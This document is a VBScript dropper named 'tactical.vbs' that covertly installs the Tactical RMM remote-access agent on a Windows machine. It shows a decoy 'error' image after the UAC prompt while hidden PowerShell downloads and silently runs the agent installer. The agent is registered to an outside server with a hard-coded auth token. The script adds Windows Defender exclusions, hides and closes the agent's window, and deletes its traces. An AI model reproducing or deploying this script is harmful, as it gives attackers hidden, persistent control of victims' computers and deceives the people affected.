' ============================================================
' tactical.vbs
' Does everything in one file:
'  1. Downloads error.png silently before UAC prompt
'  2. Triggers UAC elevation (one prompt, unavoidable)
'  3. Elevated PowerShell opens the image INSTANTLY
'  4. Install runs silently in the background
'  5. Fault-tolerant cleanup when done
' ============================================================

Dim objShell, objShellApp, objFSO, tempFolder, ps1Path, donePath, imagePath, psExe, psArgs, psScript

Set objShell    = CreateObject("WScript.Shell")
Set objShellApp = CreateObject("Shell.Application")
Set objFSO      = CreateObject("Scripting.FileSystemObject")

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
ps1Path    = tempFolder & "\tacticalagent-install.ps1"
donePath   = tempFolder & "\tacticalagent-install.done"
imagePath  = tempFolder & "\tacticalagent-error.png"

' Clear stale files from any previous run
On Error Resume Next
If objFSO.FileExists(donePath)  Then objFSO.DeleteFile donePath,  True
If objFSO.FileExists(imagePath) Then objFSO.DeleteFile imagePath, True
On Error Goto 0

' ============================================================
' STEP 1: Download error.png now, before UAC fires,
' so it is already on disk and opens instantly after elevation
' ============================================================
Dim httpImg
Set httpImg = CreateObject("MSXML2.ServerXMLHTTP.6.0")

On Error Resume Next
httpImg.Open "GET", "https://files.catbox.moe/8m1m6f.png", False
httpImg.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
httpImg.Send

If httpImg.Status = 200 Then
    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open
    adoStream.Write httpImg.responseBody
    adoStream.SaveToFile imagePath, 2
    adoStream.Close
    Set adoStream = Nothing
End If
Set httpImg = Nothing
On Error Goto 0

' ============================================================
' STEP 2: Build the PowerShell script.
' First thing it does after UAC is accepted: open the image.
' Then the install runs silently behind it.
' ============================================================
psScript = _
"# Open the pre-downloaded image immediately after UAC accepted" & vbCrLf & _
"$imgPath = Join-Path $env:TEMP 'tacticalagent-error.png'" & vbCrLf & _
"if (Test-Path $imgPath) { Start-Process $imgPath }" & vbCrLf & _
"" & vbCrLf & _
"$innosetup    = 'tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
"$api          = '""https://api.cacgreatchallange.org""'" & vbCrLf & _
"$clientid     = '1'" & vbCrLf & _
"$siteid       = '1'" & vbCrLf & _
"$agenttype    = '""server""'" & vbCrLf & _
"$power        = 0" & vbCrLf & _
"$rdp          = 0" & vbCrLf & _
"$ping         = 0" & vbCrLf & _
"$auth         = '""e47377c55d03d2147d91e2a9e6ae8834e710f774496d0eae3c8050ca6b2fa288""'" & vbCrLf & _
"$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
"$apilink      = $downloadlink.split('/')" & vbCrLf & _
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
"$serviceName  = 'tacticalrmm'" & vbCrLf & _
"" & vbCrLf & _
"$watcherJob = Start-Job -ScriptBlock {" & vbCrLf & _
"    Add-Type -Namespace Win32 -Name WinApi -MemberDefinition @'" & vbCrLf & _
"        [DllImport(""user32.dll"", SetLastError=true, CharSet=CharSet.Auto)]" & vbCrLf & _
"        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);" & vbCrLf & _
"        [DllImport(""user32.dll"")]" & vbCrLf & _
"        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" & vbCrLf & _
"        [DllImport(""user32.dll"")]" & vbCrLf & _
"        public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);" & vbCrLf & _
"'@" & vbCrLf & _
"    $timeout = (Get-Date).AddMinutes(5)" & vbCrLf & _
"    while ((Get-Date) -lt $timeout) {" & vbCrLf & _
"        $hwnd = [Win32.WinApi]::FindWindow($null, 'Tactical RMM')" & vbCrLf & _
"        if ($hwnd -ne [IntPtr]::Zero) {" & vbCrLf & _
"            [Win32.WinApi]::ShowWindow($hwnd, 0) | Out-Null" & vbCrLf & _
"            Start-Sleep -Milliseconds 100" & vbCrLf & _
"            [Win32.WinApi]::PostMessage($hwnd, 0x0010, 0, 0) | Out-Null" & vbCrLf & _
"            break" & vbCrLf & _
"        }" & vbCrLf & _
"        Start-Sleep -Milliseconds 50" & vbCrLf & _
"    }" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"If (Get-Service $serviceName -ErrorAction SilentlyContinue) {" & vbCrLf & _
"    Write-Host 'Tactical RMM Is Already Installed'" & vbCrLf & _
"} Else {" & vbCrLf & _
"    $OutPath     = $env:TMP" & vbCrLf & _
"    $output      = $innosetup" & vbCrLf & _
"    $installArgs = @('-m install --api ', ""$api"", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', ""$agenttype"", '--auth', ""$auth"")" & vbCrLf & _
"    if ($power) { $installArgs += ""--power"" }" & vbCrLf & _
"    if ($rdp)   { $installArgs += ""--rdp""   }" & vbCrLf & _
"    if ($ping)  { $installArgs += ""--ping""  }" & vbCrLf & _
"    Try {" & vbCrLf & _
"        $DefenderStatus = Get-MpComputerStatus | select AntivirusEnabled" & vbCrLf & _
"        if ($DefenderStatus -match ""True"") {" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionProcess 'C:\Windows\Temp\is-*.tmp\tacticalagent*'" & vbCrLf & _
"        }" & vbCrLf & _
"    } Catch {}" & vbCrLf & _
"    $X = 0" & vbCrLf & _
"    do {" & vbCrLf & _
"        Write-Output ""Waiting for network""" & vbCrLf & _
"        Start-Sleep -s 5" & vbCrLf & _
"        $X += 1" & vbCrLf & _
"    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)" & vbCrLf & _
"    if ($connectresult.TcpTestSucceeded -eq $true) {" & vbCrLf & _
"        Try {" & vbCrLf & _
"            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output" & vbCrLf & _
"            Start-Process -FilePath $OutPath\$output -ArgumentList ('/VERYSILENT /SUPPRESSMSGBOXES') -WindowStyle Hidden -Wait" & vbCrLf & _
"            Write-Host 'Extracting...'" & vbCrLf & _
"            Start-Sleep -s 7" & vbCrLf & _
"            Start-Process -FilePath ""C:\Program Files\TacticalAgent\tacticalrmm.exe"" -ArgumentList $installArgs -WindowStyle Hidden -Wait" & vbCrLf & _
"        } Catch {" & vbCrLf & _
"            $ErrorMessage = $_.Exception.Message" & vbCrLf & _
"            $FailedItem   = $_.Exception.ItemName" & vbCrLf & _
"            Write-Error -Message ""$ErrorMessage $FailedItem""" & vbCrLf & _
"        } Finally {" & vbCrLf & _
"            Remove-Item -Path $OutPath\$output -ErrorAction SilentlyContinue" & vbCrLf & _
"        }" & vbCrLf & _
"    } else {" & vbCrLf & _
"        Write-Output ""Unable to connect to server""" & vbCrLf & _
"    }" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"Wait-Job $watcherJob -Timeout 10 | Out-Null" & vbCrLf & _
"Remove-Job $watcherJob -Force -ErrorAction SilentlyContinue" & vbCrLf & _
"New-Item -Path (Join-Path $env:TEMP 'tacticalagent-install.done') -ItemType File -Force | Out-Null"

' ============================================================
' STEP 3: Write the PowerShell script to %TEMP%
' ============================================================
Dim ts
Set ts = objFSO.CreateTextFile(ps1Path, True, False)
ts.Write psScript
ts.Close

' ============================================================
' STEP 4: Launch elevated — one UAC prompt, then hidden
' ============================================================
psExe  = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """"

objShellApp.ShellExecute psExe, psArgs, "", "runas", 0

' ============================================================
' STEP 5: Wait for install to complete via done marker
' Timeout after 10 minutes as a safety net
' ============================================================
Dim waited
waited = 0
Do While Not objFSO.FileExists(donePath)
    WScript.Sleep 1000
    waited = waited + 1
    If waited >= 600 Then Exit Do
Loop

' ============================================================
' STEP 6: Fault-tolerant cleanup
' ============================================================
On Error Resume Next
objFSO.DeleteFile ps1Path,   True
objFSO.DeleteFile donePath,  True
objFSO.DeleteFile imagePath, True
On Error Goto 0

Set objFSO = Nothing
Set objShellApp = Nothing
Set objShell = Nothing
